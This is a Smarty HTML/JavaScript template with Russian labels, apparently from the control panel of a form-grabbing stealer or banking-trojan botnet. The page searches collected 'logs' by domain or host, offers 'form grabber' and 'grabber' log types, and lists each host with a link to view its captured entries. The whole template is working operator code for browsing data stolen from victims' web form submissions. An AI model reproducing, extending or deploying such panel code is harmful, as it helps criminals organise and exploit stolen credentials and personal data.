<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Не существующих фильтров';
var unnecessar_name_form = 'search{$rand_name}';
function submit_{$rand_name}(){ldelim}
get_hax(
	{ldelim}
		url:document.forms['search{$rand_name}'].action,
		method: document.forms['search{$rand_name}'].method,
		form: 'search{$rand_name}',
		id: id_{$rand_name} + '_content',
	{rdelim}
);
{rdelim};

</script>

<form action="/logs/unnecessary.html?window=1" name="search{$rand_name}" id="search{$rand_name}" enctype="application/x-www-form-urlencoded" method="post" onsubmit="submit_{$rand_name}(); return false;">

<div align="left">
Домен/Хост (каждая строка отдельная строка поиска):<br />
<textarea cols="1" rows="2" name="name" class="user" style="width: 800px;">{$smarty.post.name}</textarea>
<br />
Тип поиска:<br />
<select name="type" style="width: 100%;">
<option value="1" {if $smarty.post.type eq '1'}selected="selected"{/if}>Точное совпадение</option>
<option value="2" {if $smarty.post.type eq '2'}selected="selected"{/if}>Вхождение строки</option>
</select>
<br />
Тип логов:<br />
<select name="logs" style="width: 100%;">
<option value="1" {if $smarty.post.logs eq '1'}selected="selected"{/if}>Все</option>
<option value="2" {if $smarty.post.logs eq '2'}selected="selected"{/if}>ФормГраббер</option>
<option value="3" {if $smarty.post.logs eq '3'}selected="selected"{/if}>Граббер</option>
</select>
<br />
<input name="submit" type="button" value="Поиск" class="user" style="width: 100%;" onclick="submit_{$rand_name}();" />

</div>

</form>

<br />

<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
	<td style="text-align: center">Домен/Хост</td>
    <td style="text-align: center; width: 150px">Тип</td>
    <td style="text-align: center;  width: 100px"></td>
  </tr>
{foreach from=$items item=item name=logs}
{if $smarty.foreach.logs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="font-size: 10px;">
	<th>{$item->host}</th>
    <th>{if $item->type eq '6'}Граббер{elseif $item->type eq '5'}Формграббер{/if}</th>
    <th><a href="/logs/unnecessary_show-{$item->type}.html?str={$item->host}&page=0" target="_blank">просмотр</a></th>
  </tr>
{/foreach}
</table>

<br />